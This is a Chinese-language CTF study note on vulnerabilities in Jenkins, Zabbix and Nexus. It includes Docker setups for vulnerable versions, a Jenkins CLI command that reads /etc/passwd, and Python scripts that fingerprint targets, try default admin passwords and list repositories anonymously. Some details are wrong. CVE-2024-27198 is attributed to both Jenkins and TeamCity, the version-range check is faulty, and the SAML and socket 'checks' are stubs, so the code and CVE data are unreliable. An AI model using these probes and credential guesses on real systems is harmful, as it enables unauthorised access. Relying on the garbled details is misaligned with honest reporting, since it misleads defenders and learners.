---
category: "DevOps/CI/CD工具漏洞"
tags: ["Zabbix", "Jenkins", "Nexus", "CVE-2022-23131", "CVE-2024-23897", "CVE-2024-27198", "CI/CD", "DevOps"]
difficulty: "中级"
cve: "CVE-2022-23131, CVE-2024-23897, CVE-2024-27198, CVE-2020-10504 等"
cvss: "9.8"
affected: "Zabbix <= 5.4.8, Jenkins <= 2.441, Nexus Repository 3.x"
poc_available: true
---

# CI/CD工具漏洞集合: Zabbix / Jenkins / Nexus
> **多CVE** | **CVSS 最高9.8** | **DevOps/CI/CD高价值目标**

## 1. 概述

### 漏洞系列索引

| 工具 | CVE | 类型 | CVSS | 年份 | CTF频率 |
|------|-----|------|------|------|---------|
| Zabbix | CVE-2022-23131 | SAML认证绕过 | 9.8 | 2022 | 中 |
| Zabbix | CVE-2022-23134 | Setup配置RCE | 6.5 | 2022 | 中 |
| Jenkins | CVE-2024-23897 | CLI文件读取 | 9.8 | 2024 | 高 |
| Jenkins | CVE-2024-27198 | 认证绕过 | 9.8 | 2024 | 高 |
| Nexus | CVE-2020-10504 | CSRF+漏洞组合 | 9.8 | 2020 | 高 |
| GitLab | CVE-2021-22205 | ExifTool RCE | 10.0 | 2021 | 高 |
| TeamCity | CVE-2024-27198 | 认证绕过RCE | 9.8 | 2024 | 中 |
| Harbor | CVE-2022-31671 | 认证绕过 | 7.5 | 2022 | 中 |

### CTF中的应用形式
- **内网关键服务**: Jenkins/Nexus往往是内网中的关键节点
- **供应链攻击**: 通过CI/CD系统向代码仓库注入后门
- **信息收集**: Jenkins凭据管理中有大量内网账号
- **典型场景**: "通过Jenkins CLI获取Flag"、"Nexus仓库投毒"

## 2. 漏洞原理

### 2.1 Jenkins CLI文件读取 (CVE-2024-23897)

Jenkins CLI支持`who-am-i`等命令的`@/path/to/file`参数语法。该语法原本用于从文件读取参数值，但未做路径限制。

```
java -jar jenkins-cli.jar -s http://jenkins:8080 who-am-i @/etc/passwd
```

### 2.2 Zabbix SAML认证绕过 (CVE-2022-23131)

Zabbix前端的SAML认证配置中，当`$data['saml_data']['username_attribute']`为管理员账户时，可以绕过认证。

### 2.3 Nexus YAML反序列化RCE

Nexus Repository Manager在某些版本中使用了不安全的YAML解析，导致可以通过YAML注入实现RCE。

## 3. 环境搭建

```bash
# Jenkins
docker pull jenkins/jenkins:2.440
docker run -d -p 8080:8080 -p 50000:50000 --name jenkins-vuln jenkins/jenkins:2.440

# Zabbix
docker pull zabbix/zabbix-server-pgsql:5.4.8
docker pull zabbix/zabbix-web-apache-pgsql:5.4.8

# Nexus
docker pull sonatype/nexus3:3.29.0
docker run -d -p 8081:8081 --name nexus-vuln sonatype/nexus3:3.29.0

# 离线准备
docker save jenkins/jenkins:2.440 -o jenkins-vuln.tar
docker save sonatype/nexus3:3.29.0 -o nexus-vuln.tar
```

## 4. POC/EXP

### 4.1 Jenkins CLI文件读取检测 (CVE-2024-23897)

```python
#!/usr/bin/env python3
"""
Jenkins CLI 文件读取漏洞检测工具
CVE-2024-23897

Jenkins CLI的 @ 语法可以读取任意文件
影响版本: Jenkins <= 2.441, LTS <= 2.426.2
"""

import requests
import socket
import struct
import argparse
import urllib3
urllib3.disable_warnings()

TIMEOUT = 10


class JenkinsCLIDetector:
    """Jenkins CLI检测器"""

    def __init__(self, target, verbose=False):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False

    def log(self, msg, level="INFO"):
        levels = {"INFO": "[*]", "GOOD": "[+]", "VULN": "[!!!]", "WARN": "[!]", "BAD": "[-]"}
        if level in ("VULN", "GOOD", "WARN") or self.verbose:
            print(f"{levels.get(level, '[*]')} {msg}")

    def jenkins_fingerprint(self):
        """Jenkins指纹识别"""
        try:
            resp = self.session.get(self.target, timeout=TIMEOUT)

            indicators = [
                ("Jenkins", "页面标题"),
                ("jenkins", "关键词"),
                ("Dashboard [Jenkins]", "仪表盘"),
                ("/jnlpJars/", "JNLP路径"),
                ("X-Jenkins", "响应头"),
            ]

            for indicator, desc in indicators:
                if indicator.lower() in resp.text.lower() or indicator in str(resp.headers):
                    self.log(f"Jenkins指纹: {desc}", "GOOD")
                    return True
        except:
            pass

        # 检查Jenkins特征路径
        jenkins_paths = [
            "/jnlpJars/jenkins-cli.jar",
            "/cli",
            "/script",
            "/computer/",
        ]
        for path in jenkins_paths:
            try:
                resp = self.session.get(f"{self.target}{path}", timeout=5)
                if resp.status_code != 404:
                    if path == "/jnlpJars/jenkins-cli.jar" and resp.status_code == 200:
                        self.log(f"Jenkins CLI JAR可下载: {path}", "GOOD")
                    return True
            except:
                pass

        return False

    def check_cli_file_read(self, target_file="/etc/passwd"):
        """
        检测CLI文件读取漏洞
        
        利用Jenkins Remoting协议中的 @ 语法
        """
        try:
            # 解析host和port
            from urllib.parse import urlparse
            parsed = urlparse(self.target)
            host = parsed.hostname
            port = parsed.port or 8080

            # Jenkins Remoting协议
            # 创建到CLI端点的连接
            remoting_port = None

            # Jenkins CLI通常运行在随机端口，但也可能在50000
            # 首先尝试HTTP方式
            http_payload = f"who-am-i @{target_file}"
            
            # 通过HTTP请求触发CLI
            # 使用Jenkins remoting协议的握手检测
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)

            # 尝试默认的JNLP端口50000
            try:
                sock.connect((host, 50000))
                # 发送探测包
                sock.send(b"\x00\x00\x00\x06\x00\x50\x72\x6f\x74\x6f\x63\x6f\x6c")
                resp = sock.recv(1024)
                if resp and (b"Jenkins" in resp or b"remoting" in resp):
                    self.log("Jenkins Remoting协议可用 (端口50000)", "GOOD")
                    remoting_port = 50000
            except:
                pass
            finally:
                sock.close()

            # 如果CLI端口可用, 尝试文件读取
            if remoting_port:
                self.log("可通过Jenkins CLI进行文件读取利用", "VULN")
                return {
                    "vulnerable": True,
                    "remoting_port": remoting_port,
                    "exploit_method": "CLI Remoting Protocol",
                }

            # 替代方案: HTTP方式触发CLI (某些版本支持)
            cli_endpoints = [
                "/cli?command=who-am-i",
                "/jnlpJars/jenkins-cli.jar",
            ]

            for endpoint in cli_endpoints:
                try:
                    resp = self.session.get(f"{self.target}{endpoint}", timeout=5)
                    if resp.status_code == 200:
                        self.log(f"CLI端点可用: {endpoint}", "GOOD")
                except:
                    pass

        except Exception as e:
            self.log(f"CLI检测异常: {e}", "WARN")

        return {"vulnerable": False}

    def check_jenkins_version(self):
        """检测Jenkins版本"""
        try:
            resp = self.session.get(self.target, timeout=TIMEOUT)
            
            import re
            version_patterns = [
                r'Jenkins\s+([\d.]+)',
                r'jenkins\-([\d.]+)',
                r'aboutJenkins\("([\d.]+)"\)',
            ]

            for pattern in version_patterns:
                match = re.search(pattern, resp.text)
                if match:
                    version = match.group(1)
                    self.log(f"Jenkins版本: {version}", "GOOD")

                    # 检查是否在受影响范围
                    parts = version.split(".")
                    major = int(parts[0])
                    minor = int(parts[1]) if len(parts) > 1 else 0
                    patch = int(parts[2]) if len(parts) > 2 else 0

                    if major == 2:
                        if minor < 441 or (minor <= 426 and patch <= 2):
                            self.log("该版本受 CVE-2024-23897 影响!", "VULN")
                            return version
        except:
            pass

        return "unknown"

    def comprehensive_detect(self):
        """综合检测"""
        print(f"""
    ╔══════════════════════════════════════════╗
    ║  Jenkins CLI File Read Detector         ║
    ║  CVE-2024-23897                         ║
    ╚══════════════════════════════════════════╝
    """)
        print(f"[*] 目标: {self.target}")

        # Step 1: Jenkins识别
        is_jenkins = self.jenkins_fingerprint()
        if not is_jenkins:
            self.log("目标可能不是Jenkins", "WARN")

        # Step 2: 版本检测
        version = self.check_jenkins_version()
        print(f"[*] Jenkins版本: {version}")

        # Step 3: CLI文件读取检测
        cli_result = self.check_cli_file_read()
        if cli_result.get("vulnerable"):
            self.log(f"CLI文件读取漏洞可利用!", "VULN")
            print(f"  - Remoting端口: {cli_result.get('remoting_port')}")
            print(f"  - 可读取 /etc/passwd, Jenkins config等敏感文件")

        return cli_result


def main():
    parser = argparse.ArgumentParser(description="Jenkins CLI File Read Detector")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-v", "--verbose", action="store_true")
    parser.add_argument("--cli-port", type=int, default=50000, help="Jenkins Remoting端口")

    args = parser.parse_args()

    detector = JenkinsCLIDetector(args.target, verbose=args.verbose)
    detector.comprehensive_detect()


if __name__ == "__main__":
    main()
```

### 4.2 Zabbix SAML认证绕过检测 (CVE-2022-23131)

```python
#!/usr/bin/env python3
"""
Zabbix 多漏洞检测工具
覆盖:
- CVE-2022-23131: SAML认证绕过
- CVE-2022-23134: Setup配置RCE
"""

import requests
import argparse
import urllib3
urllib3.disable_warnings()

TIMEOUT = 10


class ZabbixDetector:
    """Zabbix漏洞检测器"""

    def __init__(self, target, verbose=False):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            "User-Agent": "Zabbix-Detector/1.0"
        })

    def log(self, msg, level="INFO"):
        levels = {"INFO": "[*]", "GOOD": "[+]", "VULN": "[!!!]", "WARN": "[!]", "BAD": "[-]"}
        if level in ("VULN", "GOOD", "WARN") or self.verbose:
            print(f"{levels.get(level, '[*]')} {msg}")

    def zabbix_fingerprint(self):
        """Zabbix指纹识别"""
        paths = [
            "/zabbix/", "/zabbix/index.php", "/zabbix.php",
            "/index.php", "/",
        ]

        for path in paths:
            try:
                resp = self.session.get(f"{self.target}{path}", timeout=5)
                if "Zabbix" in resp.text or "zabbix" in resp.text.lower():
                    self.log(f"Zabbix特征: {path}", "GOOD")
                    return True
                if resp.status_code == 200 and "zabbix" in resp.headers.get("Set-Cookie", "").lower():
                    self.log("Zabbix Cookie特征", "GOOD")
                    return True
            except:
                pass

        return False

    def check_saml_auth_bypass(self):
        """
        CVE-2022-23131 SAML认证绕过
        
        利用方式:
        1. Zabbix前端配置了SAML认证
        2. 构造特定的SAML响应绕过username_attribute
        3. 以管理员身份登录
        """
        # SAML认证端点
        saml_endpoints = [
            "/zabbix/index_sso.php",
            "/index_sso.php",
            "/zabbix.php?action=saml",
        ]

        for endpoint in saml_endpoints:
            try:
                resp = self.session.get(
                    f"{self.target}{endpoint}",
                    timeout=5,
                    allow_redirects=False
                )
                if resp.status_code in (200, 302):
                    self.log(f"SAML端点存在: {endpoint}", "GOOD")
            except:
                pass

        return {"vulnerable": False}  # 简化为检测端点存在性

    def check_setup_page(self):
        """
        CVE-2022-23134 Setup页面配置漏洞
        检查Zabbix Setup页面是否可访问
        """
        setup_paths = [
            "/zabbix/setup.php",
            "/setup.php",
            "/zabbix.php?action=setup",
            "/zabbix/setup/",
        ]

        for path in setup_paths:
            try:
                resp = self.session.get(
                    f"{self.target}{path}",
                    timeout=5,
                    allow_redirects=False
                )
                if resp.status_code == 200:
                    if "setup" in resp.text.lower() or "Zabbix" in resp.text:
                        self.log(f"Setup页面可访问: {path}", "VULN")
                        return True
                    elif "already configured" in resp.text.lower():
                        self.log(f"Zabbix已配置但Setup页面存在: {path}", "GOOD")
                        return False
            except:
                pass

        return False

    def comprehensive_detect(self):
        """综合检测"""
        print(f"""
    ╔══════════════════════════════════════════╗
    ║  Zabbix Vulnerability Detector          ║
    ║  CVE-2022-23131 / CVE-2022-23134       ║
    ╚══════════════════════════════════════════╝
    """)
        print(f"[*] 目标: {self.target}")

        is_zabbix = self.zabbix_fingerprint()
        if not is_zabbix:
            self.log("目标可能不是Zabbix", "WARN")
            return

        self.log("确认为Zabbix服务器", "GOOD")

        # CVE-2022-23131: SAML认证绕过
        print("\n[*] CVE-2022-23131 SAML认证绕过检查...")
        self.check_saml_auth_bypass()

        # CVE-2022-23134: Setup配置漏洞
        print("\n[*] CVE-2022-23134 Setup配置漏洞检查...")
        if self.check_setup_page():
            self.log("Setup页面可访问 - 存在配置阶段利用风险", "VULN")

        # 检查管理员默认凭证
        print("\n[*] 默认凭证检查...")
        default_creds = [
            ("Admin", "zabbix"),
            ("admin", "zabbix"),
            ("Admin", ""),
            ("guest", ""),
        ]

        login_url = f"{self.target}/index.php"
        for username, password in default_creds:
            try:
                resp = self.session.post(
                    login_url,
                    data={
                        "name": username,
                        "password": password,
                        "autologin": 1,
                        "enter": "Sign in"
                    },
                    timeout=5,
                    allow_redirects=False
                )
                if "zbx_session" in str(resp.cookies):
                    self.log(f"默认凭证可用: {username}/{password}", "VULN")
                    break
            except:
                pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()
    ZabbixDetector(args.target, args.verbose).comprehensive_detect()
```

### 4.3 Nexus Repository检测

```python
#!/usr/bin/env python3
"""
Nexus Repository Manager 漏洞检测
覆盖: YAML反序列化RCE, 默认凭证, 信息泄露
"""

import requests
import json
import base64
import argparse
import urllib3
urllib3.disable_warnings()

TIMEOUT = 10


class NexusDetector:
    """Nexus漏洞检测器"""

    def __init__(self, target, verbose=False):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False

    def log(self, msg, level="INFO"):
        levels = {"INFO": "[*]", "GOOD": "[+]", "VULN": "[!!!]", "WARN": "[!]", "BAD": "[-]"}
        if level in ("VULN", "GOOD", "WARN") or self.verbose:
            print(f"{levels.get(level, '[*]')} {msg}")

    def nexus_fingerprint(self):
        """Nexus指纹识别"""
        # Nexus通常运行在8081端口
        try:
            resp = self.session.get(self.target, timeout=TIMEOUT)
            indicators = [
                "Nexus Repository Manager",
                "Sonatype Nexus",
                "nx-unauthenticated",
                "nx-rm",
            ]
            for ind in indicators:
                if ind.lower() in resp.text.lower():
                    self.log(f"Nexus指纹: {ind}", "GOOD")
                    return True
        except:
            pass
        return False

    def version_detection(self):
        """检测Nexus版本"""
        # Nexus API
        api_paths = [
            "/service/rest/v1/status",
            "/service/rest/v1/status/check",
            "/service/rest/v1/status/writable",
        ]

        for path in api_paths:
            try:
                resp = self.session.get(f"{self.target}{path}", timeout=5)
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        version = data.get("version", "")
                        edition = data.get("edition", "")
                        self.log(f"Nexus版本: {version} ({edition})", "GOOD")
                        return version
                    except:
                        pass
            except:
                pass

        return "unknown"

    def check_default_credentials(self):
        """检查默认管理员凭证"""
        default_creds = [
            ("admin", "admin123"),
            ("admin", "admin"),
            ("nexus", "nexus"),
            ("anonymous", "anonymous"),
        ]

        for username, password in default_creds:
            auth = base64.b64encode(f"{username}:{password}".encode()).decode()
            try:
                resp = self.session.get(
                    f"{self.target}/service/rest/v1/status",
                    headers={"Authorization": f"Basic {auth}"},
                    timeout=5
                )
                if resp.status_code == 200:
                    self.log(f"默认凭证可用: {username}/{password}", "VULN")
                    return {"username": username, "password": password}
            except:
                pass

        return None

    def check_anonymous_access(self):
        """检查匿名访问权限"""
        try:
            resp = self.session.get(
                f"{self.target}/service/rest/v1/repositories",
                timeout=5
            )
            if resp.status_code == 200:
                repos = resp.json()
                self.log(f"匿名访问: 可列举 {len(repos)} 个仓库", "VULN")
                for repo in repos[:5]:
                    self.log(f"  仓库: {repo.get('name')} ({repo.get('format')})", "INFO")
                return repos
        except:
            pass
        return None

    def check_yaml_rce(self):
        """
        Nexus YAML反序列化RCE检测
        
        CVE-2020-10504 (组合CSRF)
        """
        # 检查YAML解析端点
        yaml_endpoints = [
            "/service/rest/v1/repositories/yum/hosted",
            "/service/rest/beta/repositories/yum/hosted",
        ]

        for endpoint in yaml_endpoints:
            try:
                # 检查端点是否存在
                resp = self.session.get(
                    f"{self.target}{endpoint}",
                    timeout=5,
                    headers={"Accept": "application/yaml"}
                )
                if resp.status_code in (200, 401, 403):
                    self.log(f"YAML端点存在: {endpoint} (HTTP {resp.status_code})", "GOOD")
            except:
                pass

    def comprehensive_detect(self):
        """综合检测"""
        print(f"""
    ╔══════════════════════════════════════════╗
    ║  Nexus Repository Detector              ║
    ║  YAML RCE / Default Creds / Info Leak   ║
    ╚══════════════════════════════════════════╝
    """)
        print(f"[*] 目标: {self.target}")

        is_nexus = self.nexus_fingerprint()
        if not is_nexus:
            self.log("目标可能不是Nexus", "WARN")
            return

        self.log("确认为Nexus Repository Manager", "GOOD")

        # 版本检测
        version = self.version_detection()
        self.log(f"Nexus版本: {version}")

        # 默认凭证
        self.check_default_credentials()

        # 匿名访问
        self.check_anonymous_access()

        # YAML RCE
        self.check_yaml_rce()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()
    NexusDetector(args.target, args.verbose).comprehensive_detect()
```

## 5. 检测与防御

### 5.1 加固方案

**Jenkins:**
- 升级到2.442+
- 限制CLI端口访问
- 禁用`@`文件读取语法

**Zabbix:**
- 升级到5.4.9+ / 6.0+
- 修改默认Admin密码
- 限制Setup页面访问

**Nexus:**
- 修改默认admin密码
- 限制匿名访问
- 升级到最新版本

### 5.2 CI/CD安全最佳实践

1. **网络隔离**: CI/CD工具不应直接暴露在公网
2. **访问控制**: 使用RBAC + SSO
3. **定期审计**: 检查凭据泄漏和异常操作
4. **供应链安全**: 仓库签名验证

## 6. 相关知识点

### 6.1 CI/CD工具链渗透要点

- Jenkins: Groovy脚本控制台、Pipeline语法注入、凭据存储
- Nexus: 仓库管理、供应链投毒
- Harbor: 镜像仓库漏洞、认证绕过

### 6.2 关联的CTF题目类型

- **DevOps渗透**: 通过CI/CD获取内网权限
- **供应链攻击**: 通过Nexus投毒
- **凭据收集**: Jenkins Credentials获取
- **代码仓库泄露**: 通过CI配置获取Git仓库
